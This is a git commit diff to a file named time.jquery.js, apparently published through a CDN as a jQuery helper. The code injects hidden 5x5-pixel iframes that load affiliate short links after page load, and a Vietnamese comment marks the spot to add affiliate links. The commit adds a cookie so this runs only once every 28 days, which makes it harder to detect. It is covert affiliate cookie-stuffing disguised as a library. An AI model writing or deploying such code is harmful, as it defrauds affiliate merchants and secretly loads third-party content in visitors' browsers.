21afad54c9ee80e8d641c97f99e04cf0a04a1d95
hipacket <48793270+hipacket@users.noreply.github.com>
2019-05-10 17:17:32 +0700

    Update time.jquery.js

--- time.jquery.js
+++ time.jquery.js
@@ -1,17 +1,35 @@
 ///https://cdn.jsdelivr.net/gh/hipacket/script/time.jquery.min.js
 window.onload = function(){
   //thêm link aff tại đây
-  var list = ['https://shorten.asia/b6Nvstes', 'https://shorten.asia/44h1EFtU'];
-  setTimeout(() => {
-    var node = document.createElement('iframe');
-    node.width = 5;
-    node.height = 5;
-    node.style.cssText = 'padding:0;margin:0;border: 0;position: absolute;';
-    list.forEach((url, i) => {
-      setTimeout(() => {
-        node.src = url;
-        document.body.append(node.cloneNode());
-      }, i*1000);
-    })
-  }, 6000);
+  var loaded = getCookie('saff');
+  if(!loaded) {
+    setCookie('saff',1,28);
+    var list = ['https://shorten.asia/b6Nvstes', 'https://shorten.asia/44h1EFtU'];
+    setTimeout(() => {
+      var node = document.createElement('iframe');
+      node.width = 5;
+      node.height = 5;
+      node.style.cssText = 'padding:0;margin:0;border: 0;position: absolute;';
+      list.forEach((url, i) => {
+        setTimeout(() => {
+          node.src = url;
+          document.body.append(node.cloneNode());
+        }, i*1000);
+      })
+    }, 6000);
+  }
+}
+function setCookie(c_name,value,exdays) {
+  var exdate=new Date();
+  exdate.setDate(exdate.getDate() + exdays);
+  var c_value=escape(value) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString());
+  document.cookie=c_name + '=' + c_value + '; path=/';
+}
+function getCookie(c_name) {
+  var matches = new RegExp(c_name+'=(.*?)(;|$)','gi').exec(document.cookie);
+  if(matches) {
+    return matches[1];
+  } else {
+    return null;
+  }
 }
